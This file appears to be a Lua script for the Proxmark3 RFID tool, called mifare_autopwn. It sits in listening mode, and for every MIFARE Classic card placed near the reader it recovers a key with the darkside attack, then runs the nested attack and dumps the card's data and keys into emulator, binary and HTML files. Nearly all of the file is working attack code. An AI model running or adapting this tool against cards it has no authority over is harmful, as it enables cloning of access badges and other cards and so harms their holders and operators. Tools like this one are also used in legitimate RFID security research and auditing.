local getopt = require('getopt')
local reader = require('read14a')
local cmds = require('commands')

example = "script run mifare_autopwn"
author = "Martin Holst Swende"


desc =
[[
This is a which automates cracking and dumping mifare classic cards. It sets itself into 
'listening'-mode, after which it cracks and dumps any mifare classic card that you 
place by the device. 

Arguments:
	-d 				debug logging on
	-h 				this help

Output files from this operation:
	<uid>.eml 		- emulator file
	<uid>.html 		- html file containing card data
	dumpkeys.bin	- keys are dumped here. OBS! This file is volatile, as other commands overwrite it sometimes.
	dumpdata.bin	- card data in binary form. OBS! This file is volatile, as other commands (hf mf dump) overwrite it. 

]]

-------------------------------
-- Some utilities 
-------------------------------
local DEBUG = false
--- 
-- A debug printout-function
function dbg(args)
	if DEBUG then
		print(":: ", args)
	end
end 
--- 
-- This is only meant to be used when errors occur
function oops(err)
	print("ERROR: ",err)
	return nil,err
end

--- 
-- Usage help
function help()
	print(desc)
	print("Example usage")
	print(example)
end

---
-- Waits for a mifare card to be placed within the vicinity of the reader. 
-- @return if successfull: an table containing card info
-- @return if unsuccessfull : nil, error
function wait_for_mifare()
	while not core.ukbhit() do
		res, err = reader.read1443a()
		if res then return res end
		-- err means that there was no response from card
	end
	return nil, "Aborted by user"
end

function mfcrack()
	core.clearCommandBuffer()
	-- Build the mifare-command
	local cmd = Command:new{cmd = cmds.CMD_READER_MIFARE, arg1 = 1}
	
	local retry = true
	while retry do
		core.SendCommand(cmd:getBytes())
		local key, errormessage = mfcrack_inner()
		-- Success?
		if key then return key end
		-- Failure? 
		if errormessage then return nil, errormessage end
		-- Try again..set arg1 to 0 this time. 

		cmd = Command:new{cmd = cmds.CMD_READER_MIFARE, arg1 = 0}
	end	
	return nil, "Aborted by user"
end


function mfcrack_inner()
	while not core.ukbhit() do		
		local result = core.WaitForResponseTimeout(cmds.CMD_ACK,1000)
		if result then
			-- Unpacking the three arg-parameters
			local count,cmd,isOK = bin.unpack('LL',result)

			if isOK ~= 1 then return nil, "Error occurred" end


			-- The data-part is left
			-- Starts 32 bytes in, at byte 33
			local data = result:sub(33)

			-- A little helper
			local get = function(num)
				local x = data:sub(1,num)
				data = data:sub(num+1)
				return x
			end

			local uid,nt,pl = get(4),get(4),get(8)
			local ks,nr = get(8),get(4)

			local status, key = core.nonce2key(uid,nt, nr, pl,ks)
			if not status then return status,key end

			if status > 0 then 
				print("Key not found (lfsr_common_prefix problem)")
				-- try again
				return nil,nil
			else
				return key
			end
		end
	end
	return nil, "Aborted by user"
end

function nested(key)
	local cmd = string.format("hf mf nested 1 0 A %s d",key)
	core.console(cmd)
end

function dump(uid)
	core.console("hf mf dump")
	-- Save the global args, those are *our* arguments
	local myargs = args
	-- Set the arguments for htmldump script
	args =("-o %s.html"):format(uid)
	-- call it 
	require('../scripts/htmldump')

	args =""
	-- dump to emulator
	require('../scripts/dumptoemul')
	-- Set back args. Not that it's used, just for the karma... 
	args = myargs
end

--- 
-- The main entry point
function main(args)


	local verbose, exit,res,uid,err,_
	local seen_uids = {}

	-- Read the parameters
	for o, a in getopt.getopt(args, 'hd') do
		if o == "h" then help() return end
		if o == "d" then DEBUG = true end
	end

	while not exit do
		res, err = wait_for_mifare()
		if err then return oops(err) end
		-- Seen already?
		uid = res.uid
		if not seen_uids[uid] then
			-- Store it
			seen_uids[uid] = uid
			print("Card found, commencing crack", uid)
			-- Crack it
			local key, cnt
			res,err = mfcrack()
			if not res then return oops(err) end
			_,key = bin.unpack("H6",res)
			print("Key ", key)

			-- Use nested attack
			nested(key)
			-- Dump info
			dump(uid)
		end
	end
end

-- Call the main 
main(args)
